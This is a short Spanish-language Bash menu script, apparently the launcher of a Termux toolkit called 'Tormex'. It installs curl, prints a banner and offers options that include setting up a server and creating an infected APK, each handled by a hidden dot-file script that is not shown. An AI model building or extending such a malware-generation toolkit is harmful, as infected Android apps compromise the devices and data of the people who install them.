pkg install curl -y
bash .banner
echo "Introduce la opcion que deseas realizar:"
echo ""
echo "1)Montar servidor"
echo "2)Crear apk infectado"
echo "3)Terminal"
echo "4)Ayuda"
echo "5)Salir"
echo ""
read num

# Zona if

if [[ "$num" < "1" ]]; then
bash Tormex.sh
fi

if [ "$num" = "1" ]; then
bash .srv
fi

if [ "$num" = "2" ]; then
bash .cr
fi

if [ "$num" = "3" ]; then
bash .ls
fi


if [ "$num" = "4" ]; then
bash .ay
fi

if [ "$num" = "5" ]; then
bash .banner
echo "Gracias por usar Tormex!"
fi

# Fin Zona if
